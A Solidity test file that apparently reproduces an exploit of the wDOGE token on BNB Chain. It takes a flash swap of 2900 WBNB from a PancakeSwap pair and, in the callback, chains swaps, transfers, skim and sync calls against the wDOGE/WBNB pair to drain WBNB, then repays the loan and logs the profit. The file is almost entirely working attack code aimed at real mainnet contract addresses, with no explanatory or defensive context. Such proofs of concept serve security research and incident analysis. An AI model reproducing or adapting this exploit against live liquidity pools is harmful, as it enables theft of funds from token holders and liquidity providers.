// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";


interface IpancakePair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;

    function getReserves()
    external
    view
    returns (
        uint112 _reserve0,
        uint112 _reserve1,
        uint32 _blockTimestampLast
    );
    
}
interface IWBNB {

    function deposit() payable external;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
}

interface IERC20Token {
    function totalSupply() external view returns (uint256 supply);
    function transfer(address _to, uint256 _value) external  returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
    function balanceOf(address _owner) external view returns (uint256 balance);
    function approve(address _spender, uint256 _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint256 remaining);
}

contract ContractTest is DSTest {

    IWBNB  wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    IERC20Token busd   = IERC20Token(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    IERC20Token wdoge   = IERC20Token(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);

    address public pair_of_wdoge_wbnb = 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d;

    address public  BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;

    function  test_1() public {

        IpancakePair(BUSDT_WBNB_Pair).swap(0,2900 ether, address(this), '0x00');


    }
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{
        // 黄色的warning 太恶心
        sender;
        data;
        amount0;
        amount1;
        
        wbnb.transfer(pair_of_wdoge_wbnb, 2900 ether);

        IpancakePair(pair_of_wdoge_wbnb).swap(6638066501837822413045167240755, 0, address(this), "");

        wdoge.transfer(pair_of_wdoge_wbnb, 5532718068557297916520398869451);

        IpancakePair(pair_of_wdoge_wbnb).skim(address(this));

        IpancakePair(pair_of_wdoge_wbnb).sync();

        wdoge.transfer(pair_of_wdoge_wbnb, 4466647961091568568393910837883);

        IpancakePair(pair_of_wdoge_wbnb).swap(0, 2978658352619485704640, address(this), "");

        wbnb.transfer(BUSDT_WBNB_Pair, 2910 ether);

        emit log_named_uint("The WBNB Balance of me", wbnb.balanceOf(address(this)));

    }
}
